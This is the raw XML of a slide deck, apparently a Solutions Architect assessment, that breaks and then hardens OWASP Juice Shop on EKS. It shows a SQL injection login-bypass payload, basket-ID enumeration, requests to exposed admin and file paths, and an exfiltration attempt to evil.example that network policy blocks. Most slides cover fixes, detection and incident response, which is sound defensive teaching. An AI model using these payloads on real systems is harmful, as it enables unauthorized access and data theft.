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week to design, deploy, secure and explain a modern cloud-native environment. I'll walk the lab, break it three ways live, then show how each hole gets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kept the framing in my own terms: build it properly, leave the app exploitable, and be honest about what's a real control versus a lab shortcut.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point of the shape: minimise the attack surface to exactly one thing, the application, which is what I then go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thread through all of these: spend complexity where it teaches something about security, and keep everything else boring and reliable.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Validated the whole plan before spending anything, which is how I caught the version surcharge. Suppressions are documented per line; in a real pipeline this scan is a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is independent, so if one misbehaves on the day it won't take the others down. For each: how it works, and what it hands an attacker.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 in the browser and as the raw request. Confirmed locally: it hands back an admin JWT, and the admin panel and every order open up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three-lane shape repeats for each vulnerability: fix the code, box it in, and be able to see it when it happens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Confirmed locally: an admin token (owner 1) happily read baskets 2 and 3. Same thing works from any logged-in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call this one out deliberately — it's the clearest example of why application security and platform security are two different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Confirmed locally: the acquisitions file returns 200 with real content. This is the natural bridge into the Kubernetes hardening, where app and platform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 columns as every fix slide: In the app = the developer's real fix. Around it = the Kubernetes / infra controls. Watching for it = the detection signals. Prevent in the app, contain with infra, detect at runtime.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The title does the work. This is the one vuln where the middle column is the hero. Spectrum across the three fixes: Injection - the app fix is the real one, infra is backup. Access control - the platform can't save it. Misconfig - Kubernetes earns its keep.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>In the app: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>production mode so verbose errors and debug endpoints go away (NODE_ENV=production), delete the leftover sample files, and put the admin area behind real server-side auth, not just a client-side route guard.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Around it (the emphasis): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Pod Security 'restricted' - non-root on a read-only filesystem, drop every Linux capability, default-deny networking. Even with a foothold the attacker can't write, can't escalate, can't call out.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Watching for it: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>runtime signals - requests to /ftp or /administration, a shell starting inside a container, writes where nothing should be written.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Bridge to slide 13: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>point at the middle column - these controls aren't just a claim, the hardened overlay is exactly what I apply next, live. Then advance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stays vulnerable on purpose; the overlay is a separate step. Note: enabling NetworkPolicy enforcement on the VPC CNI is a prerequisite — set it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slide. The three columns are the same three lanes from each mitigation slide, lined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 detection is the headline because prevention is never complete: a layer that watches how containers behave and alerts on the abnormal. In this lab it's a recommendation, not something running — I kept the baseline clean so the exploits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last line is the one for the panel: fix the code, but assume the next bug, and build so it's contained and visible when it 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idea, not the feature list. Then open it up for questions, and if there's time, go back into the live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E172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27460"/>
            <a:ext cx="10566400" cy="4617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E172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27460"/>
            <a:ext cx="10566400" cy="4617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890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0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Solutions Architect assessment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64358"/>
            <a:ext cx="10883392" cy="1631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24"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6200" b="1" i="0" spc="-50" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7F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Breaking, then securing, a cloud-native app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812800" y="4024511"/>
            <a:ext cx="8633460" cy="676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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9FB0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EKS lab running OWASP Juice Shop — three live exploits, and the work it takes to contain them.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5720159"/>
            <a:ext cx="12787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Taylor Wilson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40950" y="5737920"/>
            <a:ext cx="12382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0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brief, in a sentence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84313"/>
            <a:ext cx="10203180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 up a Kubernetes cluster on the cloud of my choice, run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1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OWASP Juice Shop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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it, break it three ways, and talk through how I'd stop each one.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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553494"/>
            <a:ext cx="10566400" cy="6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966244"/>
            <a:ext cx="331378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How I approached it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3311624"/>
            <a:ext cx="331378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in Terraform, so it's reproducible and I can tear it down between sessions.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487267" y="2966244"/>
            <a:ext cx="33138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real posture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7267" y="3311624"/>
            <a:ext cx="331388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nodes, scoped API access, encrypted secrets — I treated it like production, not a toy.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61834" y="2966244"/>
            <a:ext cx="33138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Vulnerable on purpose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61834" y="3311624"/>
            <a:ext cx="33138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 itself stays unpatched, so the exploits actually land in front of you.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6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How the lab fits together</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Image 0" descr="Lab topology: attacker over HTTP to a public load balancer, forwarding to the Juice Shop pod in a private subnet inside an EKS node group, with an AWS-managed control plane">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="-37" r="-37" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1302445"/>
            <a:ext cx="4445000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4200" y="2283520"/>
            <a:ext cx="588645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Traffic comes in through a single public load balancer and nothing else. The pod runs on a node with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1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public IP</a:t>
            </a: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tucked in a private subnet; anything it sends out leaves through one NAT gateway.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64200" y="3343970"/>
            <a:ext cx="588645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control plane is AWS-managed, and I locked its API endpoint to my own IP rather than leaving it open to the internet.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73725" y="4118670"/>
            <a:ext cx="0" cy="546100"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="19C3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35650" y="4144070"/>
            <a:ext cx="570985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public door, everything else private — so the only thing an outsider can touch is the app itself.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6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few decisions I'd defend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58020"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D7DE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613595"/>
            <a:ext cx="54416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EKS over self-managed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1905695"/>
            <a:ext cx="544169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managed control plane means the week goes to the security story, not babysitting etcd.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6000" y="1458020"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350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0" y="1613595"/>
            <a:ext cx="54416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Terraform over clicking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0" y="1905695"/>
            <a:ext cx="544169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Reproducible and reviewable, and I can destroy the whole thing with one command.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2800" y="2369245"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="635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24820"/>
            <a:ext cx="54416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Real nodes over Fargate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2816920"/>
            <a:ext cx="544169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node layer makes the runtime controls and the exploits concrete instead of hidden.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6000" y="2369245"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="635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0" y="2524820"/>
            <a:ext cx="54416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Private nodes, one NAT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0" y="2816920"/>
            <a:ext cx="544169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Realistic posture at lab cost. The single NAT is a known non-HA shortcut, not an oversight.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800" y="3280470"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D7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3436045"/>
            <a:ext cx="54416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plain load balancer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3728145"/>
            <a:ext cx="544169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extra moving parts for a reliable demo; ALB plus a WAF is the production step up.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6000" y="3280470"/>
            <a:ext cx="5283200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="D7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0" y="3436045"/>
            <a:ext cx="54416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API scoped to my IP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0" y="3728145"/>
            <a:ext cx="544169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 enough to reach from my laptop, but not open to the whole internet.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Built as code — and scanned like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02060"/>
            <a:ext cx="5080000" cy="1272480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6986"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726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630660"/>
            <a:ext cx="476148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terraform apply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41400" y="1902420"/>
            <a:ext cx="476148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kubectl apply -f k8s/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41400" y="2250380"/>
            <a:ext cx="476148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9C3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✓ same cluster + app, every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2800" y="2826941"/>
            <a:ext cx="52324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61 resources</a:t>
            </a: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from one apply · EKS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1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1.36</a:t>
            </a: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still in standard support · secrets encrypted with a rotating key.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99200" y="1402060"/>
            <a:ext cx="523240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 scanned the plan with Checkov — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1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twelve findings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="13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sorted honestly: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99200" y="2019796"/>
            <a:ext cx="5080000" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="19C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9200" y="2165846"/>
            <a:ext cx="5232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A8E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  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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logging on, and IMDSv2 so a hijacked pod can't lift the node's credentials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99200" y="2699246"/>
            <a:ext cx="5232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False  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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"unsupported version" was wrong; a couple only looked off at plan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99200" y="3232646"/>
            <a:ext cx="5232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Accepted  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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scoped endpoint, log retention, flow logs — each with a written reason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278459"/>
            <a:ext cx="981075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spc="-50" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7F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Three ways in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302000"/>
            <a:ext cx="928751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9FB0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 picked one from injection, one from broken access control, one from misconfiguration — three different kinds of mistake, not three versions of the same one.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4312841"/>
            <a:ext cx="14501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9C3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A03</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="150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Injection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6884" y="4312841"/>
            <a:ext cx="268614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9C3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A01</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="150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Broken access control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63034" y="4312841"/>
            <a:ext cx="224111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9C3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A05</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="150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Misconfiguration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4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A03</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D64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Injection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342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Logging in as admin without a password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78880"/>
            <a:ext cx="497078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login form stitches my input straight into a SQL query, so whatever I type in the email box runs as part of the query.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12800" y="2685355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move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962176"/>
            <a:ext cx="497078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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1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' OR 1=1--</a:t>
            </a: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where the email goes. The condition is always true and the comment drops the password check entirely.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618607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642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it gets them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95427"/>
            <a:ext cx="497078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full admin session, no credentials. A bigger payload reads arbitrary tables.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94400" y="2122190"/>
            <a:ext cx="5384800" cy="1808460"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4916"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6273800" y="2401590"/>
            <a:ext cx="49707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POST /rest/user/login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3800" y="2686050"/>
            <a:ext cx="497078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"email": "' OR 1=1--",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26200" y="2994025"/>
            <a:ext cx="4813808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"password": "x" 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73800" y="3441700"/>
            <a:ext cx="49707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9C3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200   admin@juice-sh.op, token issued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Closing the injection hole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33810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="19C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617960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 the app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98144" y="1948160"/>
            <a:ext cx="325577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Parameterized queries — the real fix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input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database account with least privilege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70400" y="1433810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C7D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0400" y="1617960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Around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55744" y="1948160"/>
            <a:ext cx="3255772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WAF in front catches the obvious payloads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Egress limits mean a dumped table can't leave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8000" y="1433810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="E0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0" y="1617960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Watching for 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13344" y="1948160"/>
            <a:ext cx="325577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WAF rule hits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audit logs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Odd outbound traffic right after a login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309441"/>
            <a:ext cx="1046480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Parameterized queries are the actual fix. Everything to the right of that assumes the fix might fail — and still makes the attacker's life hard.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4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A01</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D64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Broken access control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342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Reading a stranger's shopping basket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78880"/>
            <a:ext cx="497078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API checks that I'm logged in, but never that the basket I'm asking for is actually mine.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12800" y="240913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move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685951"/>
            <a:ext cx="497078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 in as an ordinary user, then just change the id in the URL to someone else's.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342382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642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it gets them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619202"/>
            <a:ext cx="497078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customers' data — and counting up through the ids harvests all of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94400" y="1969492"/>
            <a:ext cx="5384800" cy="1837630"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4838"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6273800" y="2248892"/>
            <a:ext cx="49707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my token, baskets that aren't mine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3800" y="2533352"/>
            <a:ext cx="497078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 /rest/basket/2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73800" y="2855913"/>
            <a:ext cx="497078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 /rest/basket/3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73800" y="3318173"/>
            <a:ext cx="49707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9C3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returns both, no error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one the platform can't save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224260"/>
            <a:ext cx="10464800" cy="5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firewall or network rule fixes a missing ownership check. This one has to be fixed in the code — the honest limit of infrastructure security.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12800" y="2044005"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="19C3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228155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 the app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8144" y="2558355"/>
            <a:ext cx="3255772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object belongs to the caller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Enforce it on every request, not just the UI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Hard-to-guess ids as a backstop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70400" y="2044005"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C7D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0400" y="2228155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Around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5744" y="2558355"/>
            <a:ext cx="325577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Can't fix the logic here — be honest about that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Rate-limiting slows the enumeration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0" y="2044005"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="E0A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0" y="2228155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Watching for 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3344" y="2558355"/>
            <a:ext cx="325577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token walking through sequential ids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session reading far more than usual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4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A05</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D64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Misconfiguration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342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Doors left open from the start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78880"/>
            <a:ext cx="497078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Leftover defaults expose confidential files and a whole admin area that nobody locked down.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12800" y="240913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move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685951"/>
            <a:ext cx="497078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 ask for the sensitive paths directly. No login, no trick — they answer.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342382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642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it gets them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619202"/>
            <a:ext cx="497078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documents and privileged screens — usually the first foothold into everything else.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94400" y="2002532"/>
            <a:ext cx="5384800" cy="1771650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5018"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6273800" y="2281932"/>
            <a:ext cx="497078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 /ftp/acquisitions.md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73800" y="2589907"/>
            <a:ext cx="49707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9C3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200 — confidential doc, wide open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73800" y="2977257"/>
            <a:ext cx="497078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 /#/administration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73800" y="3285232"/>
            <a:ext cx="49707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9C3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admin panel just loads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Where Kubernetes actually earns its keep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33810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="19C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617960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 the app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98144" y="1948160"/>
            <a:ext cx="325577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mode, no debug surface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the sample files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the admin area behind real auth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70400" y="1433810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C7D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0400" y="1617960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Around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55744" y="1948160"/>
            <a:ext cx="325577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non-root on a read-only filesystem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every Linux capability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Default-deny networking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8000" y="1433810"/>
            <a:ext cx="3251200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="E0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0" y="1617960"/>
            <a:ext cx="33487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Watching for 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13344" y="1948160"/>
            <a:ext cx="325577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Hits on the sensitive paths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shell starting inside a container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where nothing should be written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045321"/>
            <a:ext cx="10464800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middle column is exactly what I apply next — the hardened overlay, live.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bug survives. The damage doesn't.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37666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 switch on the hardened overlay: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7763" y="1770360"/>
            <a:ext cx="4878197" cy="115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037" indent="-169037">
              <a:lnSpc>
                <a:spcPts val="2228"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="13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Non-root, read-only filesystem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037">
              <a:lnSpc>
                <a:spcPts val="2228"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="13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capability dropped</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037">
              <a:lnSpc>
                <a:spcPts val="2228"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="13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service-account token in the pod</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037">
              <a:lnSpc>
                <a:spcPts val="2228"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="135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Networking locked to default-deny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94400" y="1376660"/>
            <a:ext cx="5384800" cy="1804491"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4927"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6273800" y="1656060"/>
            <a:ext cx="49707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0C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attacker tries to phone home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73800" y="1940520"/>
            <a:ext cx="497078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kubectl exec juice-shop --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26200" y="2252861"/>
            <a:ext cx="4813808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 https://evil.example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3800" y="2692202"/>
            <a:ext cx="49707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6B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blocked by network policy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800" y="3435152"/>
            <a:ext cx="1059561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SQL injection is still there — hardening doesn't touch the code. But now a foothold can't exfiltrate, can't escalate on the node, can't move sideways. The hole stays; the blast radius shrinks to almost nothing.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One bug, three places to stop it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14760"/>
          <a:ext cx="10553700" cy="1606550"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2005203"/>
                <a:gridCol w="2849499"/>
                <a:gridCol w="3166110"/>
                <a:gridCol w="2532888"/>
              </a:tblGrid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 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 the app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Around it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Watching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Injection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Parameterized queries, least-priv DB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WAF, egress limits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 hits, DB audit, odd egress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Access control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Per-object ownership checks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Rate-limiting (logic can't be fixed here)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token walking the ids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Misconfig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 config, remove files, gate admin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Non-root, read-only, default-deny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0E17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Sensitive-path hits, shell in container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300710"/>
            <a:ext cx="10595610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there's one thing to take away, it's this: fix the code, box it in, and still be able to see it. No single row is trusted on its own.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If this were production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173460"/>
            <a:ext cx="113792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so far is the lab. Here's what I'd add to run the same workload for real — layered on top, not instead of what's there.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1663005"/>
            <a:ext cx="5187950" cy="1418530"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 693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189478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At the edge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2199580"/>
            <a:ext cx="486613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ALB with a WAF in front, TLS terminated there — the common payloads never reach the app.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84900" y="1659830"/>
            <a:ext cx="5194300" cy="1424880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7130"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E1726"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6413500" y="188843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C3A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Watching the runtime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3500" y="2193230"/>
            <a:ext cx="4879213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detection agent on every node, wired to alerts. It catches what a successful exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="120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shell opening, traffic heading somewhere it shouldn't.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265686"/>
            <a:ext cx="5187950" cy="1210270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3497461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Identity &amp; secrets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7750" y="3802261"/>
            <a:ext cx="486613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Scoped per-pod permissions, secrets pulled from a manager instead of baked into images.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8075" y="3265686"/>
            <a:ext cx="5187950" cy="1210270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850" y="3497461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Before it ships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850" y="3802261"/>
            <a:ext cx="486613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 scanned in CI, delivery through GitOps so what's running is always what's in git.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707731"/>
            <a:ext cx="105956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I'd reach for first is runtime detection: you ship assuming the code has bugs, so you need to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" i="1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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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moment one gets used.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spc="-25" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E172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If it happened for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160760"/>
            <a:ext cx="10595610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 the SQL injection shows up in production. Roughly how I'd run it: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1663303"/>
            <a:ext cx="351439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9C3A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Detect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029023"/>
            <a:ext cx="351439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WAF spike or odd egress trips the alarm; declare it, pick an incident lead.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934" y="1663303"/>
            <a:ext cx="351439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9C3A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Triage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934" y="2029023"/>
            <a:ext cx="351439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far did they get — a login, or a full dump? That sets the severity.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67067" y="1663303"/>
            <a:ext cx="351439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9C3A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Contain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67067" y="2029023"/>
            <a:ext cx="351439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 at the WAF, cut egress, snapshot the pod, rotate the secrets.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2636044"/>
            <a:ext cx="351439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9C3A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Eradicate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001764"/>
            <a:ext cx="351439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 the real fix; clear out anything they left behind.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934" y="2636044"/>
            <a:ext cx="351439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9C3A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Recover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934" y="3001764"/>
            <a:ext cx="351439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Bring it back behind the WAF, check the data's intact, lift the clamps.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67067" y="2636044"/>
            <a:ext cx="351439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9C3A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Learn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67067" y="3001764"/>
            <a:ext cx="351439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Blameless postmortem; turn the gaps into permanent CI and detection gates.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325" y="3697684"/>
            <a:ext cx="0" cy="290116"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="19C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250" y="3723084"/>
            <a:ext cx="10419017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bug was the way in — but it stayed an incident, not a breach, because the runtime controls capped the damage and left us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38200"/>
            <a:ext cx="5206238" cy="170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i="0" spc="-25" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5F7F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Fix the code. Expect the next bug anyway.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12800" y="2721372"/>
            <a:ext cx="5206238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9FB0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lab built like the real thing, broken three ways in front of you, and a layered defense that keeps any one hole from becoming a breach.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24600" y="914400"/>
            <a:ext cx="52062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C3A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Given more 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9563" y="1270000"/>
            <a:ext cx="5113655" cy="1191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037" indent="-169037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 detection, wired to alerts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037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WAF at the edge</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037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Scoped identities and managed secrets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="169037" indent="-169037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Scanned images, GitOps delivery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2800" y="57887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0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Infrastructure, manifests, the exploit runbook, and this deck all live in the repo — thanks for your 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wind SA Assessment Deck">
  <a:themeElements>
    <a:clrScheme name="Upwind SA Assessment Deck">
      <a:dk1>
        <a:srgbClr val="0E1726"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="F5F7FA"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="484F5B"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="DEE1E5"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="19C3A8"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="D6422F"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="FF6B5E"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="566576"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="9FB0C3"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="9AA0A6"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0563C1"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="954F72"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Upwind SA Assessment Deck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Upwind SA Assessment Deck</dc:title>
  <dc:subject/>
  <dc:creator/>
  <cp:lastModifiedBy/>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-15T01:48:44Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-15T01:48:44Z</dcterms:modified>
</cp:coreProperties>
</file>